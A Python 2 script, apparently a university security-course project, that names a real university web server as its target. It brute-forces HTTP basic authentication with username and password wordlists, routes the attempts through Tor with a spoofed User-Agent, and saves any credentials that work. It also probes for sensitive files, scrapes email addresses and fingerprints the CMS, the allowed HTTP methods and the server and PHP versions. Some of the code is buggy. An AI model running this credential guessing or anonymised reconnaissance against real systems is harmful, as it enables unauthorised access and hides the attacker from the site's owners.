#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
#servidor a atacar www.ingenieria.unam.mx
#CORONA GERARDO, REYES JAIRO
#python proyecto.py -s www.ingenieria.unam.mx ++++banderas
#El archivo de configuracion se llama config.txt
#el archivo para encontrar archivos sensibles es archivo.txt o archivos2.txt

import sys
import optparse
import os.path
from requests import get
import requests
from requests.exceptions import ConnectionError
from datetime import datetime
from requests.auth import HTTPDigestAuth
import socks
import socket
import urllib2
import re

reporte=open('reporte.txt','w')
def printError(msg, exit = False):
        """
        Imprime el error recibiendo el mensaje y establece el valor de exit en 
        False
        RECIBE: msg (String), exit (Boolean)
        REGRESA: 
        """
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    """
    Crea las banderas para agregar las opciones en la linea de comandos
    al momento de ejecutar el programa
    RECIBE: 
    REGRESA: opts (OptionParser)
    """
    try:
        parser = optparse.OptionParser()
        parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
        parser.add_option('-C','--cms', dest='cms', default=None, action='store_true' , help='Habilita el CMS.')
        parser.add_option('-t', '--tor', dest='tor', action='store_true', default=None, help='Para hacer un ataque a traves de tor')
        parser.add_option('-c','--correo', dest='correo', default=None, action='store_true', help='Jalar correos.')
        parser.add_option('-K','--Kabeceras', dest='Kabeceras', default=None, action='store_true' , help='Cabeceras')
        parser.add_option('-r','--report', dest='report', default=None, action='store_true', help='File where the results will be reported.')
        parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
        parser.add_option('-b','--busqueda', dest='busqueda', default=None, help='Busca archivos en el servidor')
        parser.add_option('-a','--archivo', dest='archivo', default=None, help='archivo de configuracion')
        parser.add_option('-m','--metodos', dest='metodos', action='store_true', default=None, help='archivo de configuracion')
        parser.add_option('-H','--https', dest='https', action='store_true', default=None, help='habilita https')
        parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
        parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
        parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
        parser.add_option('-A','--agent', dest='agent', default=None, action='store_true', help='Cambia el agente de usuario en la peticion de tor')
        opts,args = parser.parse_args()
        return opts
    except Exception as e:
        printError('Ocurrio un error inesperado al obtener las opciones desde la linea de comandos')

def checkOptions(options):
    """
    Verifica que la opcion --server o -s contenga un argumento
    sino, llama a la funcion printError mandando el mensaje 
    "Debes especificar un servidor a atacar"
    """
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)

def buildURL(server,port, protocol = 'http'):
    """
    Funcion que construye la URL del servidor a partir de los argumentos de las opciones de la linea de comandos.
    Si el protocolo se especifica por defecto es http.
    RECIBE: server (String), port (String), protocol (String)
    REGRESA: url (String)
    """
    try:
        url = '%s://%s:%s' % (protocol,server,port)
        return url
    except Exception as e:
        printError('Ocurrio un error inesperado en la url del servidor')

def archivo_config(opts):
    """
    Configura las opciones a mostrar comparando las banderas ingresadas con la configuracion previa del archivo 
    que contiene la configuraciones, dandole mas preferencia a las opciones ingresadas en la linea de comandos 
    que en el archivo de configuracion. Ej. Si una bandera esta en estado off en el archivo de configuracion, 
    y desde la linea de comandos se indica, esta bandera (opcion) se mostrara en la ejecucion del programa
    RECIBE: opts (OptionParser), estado de las opciones ingresadas desde la linea de comandos
    REGRESA: opts (OptionParser), estados de las opciones ya modificadas
    """
    try:
        f1=open(opts.archivo,'r')
        for a in f1.readlines():
            primer_valor = a[:-1].split('=')[0]
            segundo_valor = a[:-1].split('=')[1]
            if re.match('agent',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.agent:
                        if opts.report:
                            reporte.write("opts.agent True\n")
                        opts.agent=True
                    else:
                        opts.agent=False
                        if opts.report:
                            reporte.write("opts.agent False\n")
            else:
                opts.Kabeceras=True
            if re.match('https',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.https:
                        if opts.report:
                            reporte.write("opts.https True\n")
                        opts.https=True
                    else:
                        opts.https=False
                        if opts.report:
                            reporte.write("opts.https False\n")
                else:
                    opts.Kabeceras=True
            if re.match('Kabeceras',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.Kabeceras:
                        opts.Kabeceras=True
                        if opts.report:
                            reporte.write("opts.Kabeceras True\n")
                    else:
                        opts.Kabeceras=False
                        if opts.report:
                            reporte.write("opts.Kabeceras False\n")
                else:
                    opts.Kabeceras=True
            if re.match('metodos',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.metodos:
                        opts.metodos=True
                        if opts.report:
                            reporte.write("opts.metodos True\n")
                    else:
                        opts.metodos=False
                        if opts.report:
                            reporte.write("opts.metodos False\n")
                else:
                    opts.Kabeceras=True
            if re.match('correo',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.correo:
                        opts.correo=True
                        if opts.report:
                            reporte.write("opts.correo True\n")
                    else:
                        opts.correo=False
                        if opts.report:
                            reporte.write("opts.correo False\n")
                else:
                    opts.correo=True
            if re.match('tor',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.tor:
                        opts.tor=True
                        if opts.report:
                            reporte.write("opts.tor True\n")
                    else:
                        opts.tor=False
                        if opts.report:
                            reporte.write("opts.tor False\n")
            else:
                    opts.tor=True
            if re.match('report',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.report:
                        opts.report=True
                        if opts.report:
                            reporte.write("opts.report True\n")
                    else:
                        opts.report=False
                        if opts.report:
                            reporte.write("opts.report False\n")
            else:
                    opts.report=True
            if re.match('verbose',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.verbose:
                        opts.verbose=True
                        if opts.report:
                            reporte.write("opts.verbose True\n")
                    else:
                        opts.verbose=False
                        if opts.report:
                            reporte.write("opts.verbose False\n")
                else:
                    opts.verbose=True
            if re.match('cms',primer_valor):
                if re.match('off',segundo_valor):
                    if opts.cms:
                        opts.cms=True
                        if opts.report:
                            reporte.write("opts.cms True\n")
                    else:
                        opts.cms=False
                        if opts.report:
                            reporte.write("opts.cms False\n")
                else:
                    opts.cms=True
        f1.close()
        return opts
    except Exception as e:
        printError('Ocurrio un error inesperado al configurar las opciones')


def gethtml(url):
	try:
		req = urllib2.Request(url)
		return urllib2.urlopen(req).read()
	except Exception, e:
		print "No se encontro la URL"
	return ''

def makeRequest(host, user, password):
    """
    Hace una peticion a un servidor para validar las credenciales. 
    RECIBE: host (String), user (String), password (String)
    REGRESA: True (Boolean) si se encontraron credenciales validas y las imprime a pantalla, 
            False (Boolean) si no funcionaron las credenciales. 
            Error: Si no hay conexion con el servidor
    """
    try:
    	response = get(host, auth=(user,password))
    	if response.status_code == 200:
    	    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            archivo=open('archivo2.txt','w')
            archivo.write(user+','+password)
            archivo.close()
            return True
    	else:
    	    print 'NO FUNCIONO :c '
            return False
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

def mostrar_agente(opts):
    """
    Configura y modifica el nombre de agente por el nombre indicado en un archivo 
    RECIBE: opts (OptionParser)
    REGRESA: segundo_valor (String)
    """
    try:
    	f1=open(opts.archivo,'r')
    	for a in f1.readlines():
    		primer_valor = a[:-1].split('=')[0]
    		segundo_valor = a[:-1].split('=')[1]
    		if opts.verbose:
    			print primer_valor
    			print segundo_valor
    		if re.match('agente',primer_valor):
    			if opts.report:
    				write("Agente" + segundo_valor)
    			return segundo_valor
    	f1.close()	
    except Exception as e:
        printError('Ocurrio un error inesperado al modificar el agente')

def peticion_tor(opts,url):
    """
    Hace autenticacion por basic
    RECIBE: opts (OptionParser) , url (String)
    """
    ad=0
    #Cuando metes unicamente el nombre de usuario y la contraseña, cuando asson archivos, si no viene mas abajo, no se implemento
    try:
        if os.path.isfile(opts.user)==False and os.path.isfile(opts.password)==False:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket 
            val = urllib2.build_opener()
            if opts.agent:
                agentote= mostrar_agente(opts)
                if opts.verbose:
                    print agentote
                val.addheaders = [('User-Agent', agentote)]
            else:
                val.addheaders = [('User-Agent', 'Valorrizablev')]
            val.open(url)
            if opts.report:
            	write("Haciendo Peticion "+url+opts.upser+opts.password)
            makeRequest(url, opts.user, opts.password) 
            ad+=1
        #cuando metes el nombre de usuario unicamente y el archivo con contraseñas
        elif os.path.isfile(opts.user)==False and os.path.isfile(opts.password):
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket 
            val = urllib2.build_opener()
            if opts.agent:
                agentote= mostrar_agente(opts)
                if opts.verbose:
                    print agentote
                val.addheaders = [('User-Agent', agentote)]
            else:
                val.addheaders = [('User-Agent', 'Valorrizablev')]
            val.open(url)
            f2= open(opts.password,'r')
            for lines in f2.readlines():
                if opts.verbose:
                    print lines
                password = lines[:-1]
                if opts.report:
                    write("Haciendo Peticion "+url+opts.upser+password)
                makeRequest(url, opts.user, password)
            f2.close()
        #cuando metes la contraseña unicamente y el archivo con usuarios
        elif os.path.isfile(opts.user) and os.path.isfile(opts.password)==False:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket 
            val = urllib2.build_opener()
            if opts.agent:
                agentote= mostrar_agente(opts)
                if opts.verbose:
                    print agentote
                val.addheaders = [('User-Agent', agentote)]
            else:
                val.addheaders = [('User-Agent', 'Valorrizablev')]
            val.open(url)
            f2= open(opts.user,'r')
            for lines in f2.readlines():
                if opts.verbose:
                    print lines
                user = lines[:-1]
                if opts.report:
                    write("Haciendo Peticion "+url+user+opts.password)
                makeRequest(url, user, opts.password)
            f2.close()
        #si se ingresa tanto el archivo de usuarios como el de contraseñas
        elif os.path.isfile(opts.user) and os.path.isfile(opts.password):
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket 
            val = urllib2.build_opener()
            if opts.agent:
                agentote= mostrar_agente(opts)
                if opts.verbose:
                    print agentote
                val.addheaders = [('User-Agent', agentote)]
            else:
                val.addheaders = [('User-Agent', 'Valorrizablev')]
            val.open(url)
            f2= open(opts.user,'r')
            for lines in f2.readlines():
                if opts.verbose:
                    print lines
                user = lines[:-1]
                f1= open(opts.password,'r')
                for lines2 in f1.readlines():
                    if opts.verbose:
                        print lines
                    password = lines2[:-1]
                    if opts.report:
                        write("Haciendo Peticion "+url+user+password)
                    makeRequest(url, user, password)
                f1.close()
            f2.close()
    except Exception as e:
        printError('Ocurrio un error inesperado al ejecutar la opcion tor')

def reportResults():
    """
    Crea el reporte de los datos obtenidos dando la opcion de elegir al usuario si lo desea 
    visualizarlo en un archivo en pantalla o en ambos.
    """
    try:
        print "Reporte\n1.-En Pantalla\n2.-En archivo\n3.-Ambos"
        while 1:
            var=raw_input('Ingrese la opcion: ')
            if int(var)==1:
                return 1
            elif int(var)==2:
                return 2
            elif int(var)==3:
                return 3
            else:
                print "opcion no encontrada\n"
        pass
    except Exception as e:
        printError('Ocurrio un error inesperado al generar el reporte')

def implementar_busqueda(opts,url):
    """
    Se implementa la funcion para hacer la busqueda de los datos por medio de peticiones get
    RECIBE: opts (OptionParser), url (String)
    REGRESA: 
    """
	#Activar el print si entra en modo verboso
	#print "Buscando archivos sensibles"
    try:
    	f1=open(opts.busqueda,'r')
    	bus=open('archivos_sensibles.txt','w')
    	for a in f1.readlines():
    		if opts.verbose:
    			print "Buscando el Archivo " + a
    		if opts.report:
    			reporte.write("Buscando el Archivo " + a)
    		cont=0
    		host=url+"/"+a
    		reque=requests.get(host[:-1])
    		if reque.status_code==200:
    			for s in reque.history:
    				if s.status_code==302:
    					cont=1
    			if cont==0:
    				if opts.report:
    					reporte.write("Archivo encontrado "+a+"\n")
    				bus.write(a+"\n")
    	f1.close
    	bus.close
    except Exception as e:
        printError('Ocurrio un error inesperado al realizar la busqueda de los archivos')



if __name__ == '__main__':
    """
    Bloque de codigo principal, dadas las opciones ingresadas desde la linea de comandos se hara la busqueda de los datos 
    a partir de las peticiones, se buscara el cms de la pagina, los metodos http que tienen permitidos los servidores
    asi como crear el reporte final del analisis en general. 
    RECIBE: 
    REGRESA: 
    """
    #Abrimos los 2 archivos que recibe como argumentos para jalar tanto los usuarios como las contraseñas
    #de un archivo.txt
    
    try:
        opts = addOptions()
        checkOptions(opts)
        if opts.https:
        	url=buildURL(opts.server,opts.port,protocol='https')
        else:
        	url=buildURL(opts.server,opts.port)
        #implementa el reporte
        
        if opts.report:
            #print opts.report
            vari = reportResults()
            if vari == 1:
                print "\nLa fecha de ejecucion del programa es: "+ str(datetime.now()) + "\n\nIP: " + opts.server + "\nPuerto: " + opts.port + "\n"
                opts.verbose=True
            elif vari==2:
                reporte.write("\nLa fecha de ejecucion del programa es: "+ str(datetime.now()) + "\n\nIP: " + opts.server + "\nPuerto: " + opts.port + "\n")
            elif vari==3:
                print "\nLa fecha de ejecucion del programa es: "+ str(datetime.now()) + "\n\nIP: " + opts.server + "\nPuerto: " + opts.port + "\n"
                opts.verbose=True
                reporte.write("\nLa fecha de ejecucion del programa es: "+ str(datetime.now()) + "\n\nIP: " + opts.server + "\nPuerto: " + opts.port + "\n")        	
        if opts.archivo:
        	opts=archivo_config(opts)
        #opcion para buscar el cms
        if opts.cms:
        	f1=open('archivo.txt','w')
        	f1.write(gethtml(url))
        	f1.close()
        	f1=open('archivo.txt','r')
        	cont=0
        	for a in f1.readlines():
        		if opts.verbose:
        			print a
        		var = re.findall('<meta name=\"generator\" content=\".*\"',a)
        		if var!= []:
        			cont=1
        			if opts.report:
        				reporte.write("El cms es: " + var[0].split(">")[0].split("\"")[3] + "\n")
        			print "El cms es: " + var[0].split(">")[0].split("\"")[3] + "\n"
        	if(cont==0):
        		print "No se encontro el CMS" + "\n"
        	f1.close()
        #opcion para encontrar los metodos http
        if opts.metodos:
        	try:
        		if opts.report:
        			reporte.write("Metodos http permitidos: " + requests.options(url).headers['allow'] + "\n")
        		print "Metodos http permitidos: " + requests.options(url).headers['allow'] + "\n"
        	except Exception as e:
        		print "Los metodos no se encuentra o estan ocultos" + "\n"
        #muestra la URL del servidor
        if opts.server:
        	if opts.report:
        		reporte.write("URL de servidor:" + opts.server  + "\n")
        	print "URL de servidor:" + opts.server  + "\n"
        #implementa la busqueda de archivos
        if opts.busqueda:
        	implementar_busqueda(opts,url)
        #Habilita peticiones por medio de tor
        if opts.tor:
        	if opts.user:
        		if opts.password:
        			peticion_tor(opts,url)
        		else:
        			print "No se puede usar tor a menos que especifiques una contraseña o archivo de contraseñas"
        	else:
        		print "No se puede usar tor a menos que especifiques un usuario o archivo de usuarios" + "\n"
        #Muestra los correos que contiene la pagina
        if opts.correo:
        	f1=open('archivo.txt','w')
        	f1.write(gethtml(url))
        	f1.close()
        	f1=open('archivo.txt','r')
        	cont=0
        	for a in f1.readlines():
        		if opts.verbose:
        			print a
        		var = re.findall('[a-zA-Z_\.]+@[a-zA-Z\.]+',a)
        		if var!= []:
	        		if opts.report:
	        			reporte.write("Correo: " + var[0] + "\n")
        			cont=1
        			print "Correo: " + var[0] + "\n"
        	if(cont==0):
        		print "No se encontro el CMS" + "\n"
        	f1.close()
        #Te muestra las cabeceras de la version del servidor y PHP
        if opts.Kabeceras:
        	try:
        		if opts.report:
        			reporte.write("Version de Servidor: " + get(url).headers['server'] + "\n")
        		print "Version de Servidor: " + get(url).headers['server'] + "\n"
        	except Exception as e:
        		print "No se identifica la version del servidor" + "\n"
        	try:
        		if opts.report:
        			reporte.write("Version de PHP: " + get(url).headers['x-powered-by'] + "\n")
        		print "Version de PHP: " + get(url).headers['x-powered-by'] + "\n"
        	except Exception as e:
        		print "No cuenta con version de PHP o esta oculto" + "\n"
    except Exception as e:
        printError('Ocurrio un error inesperado')
reporte.close()
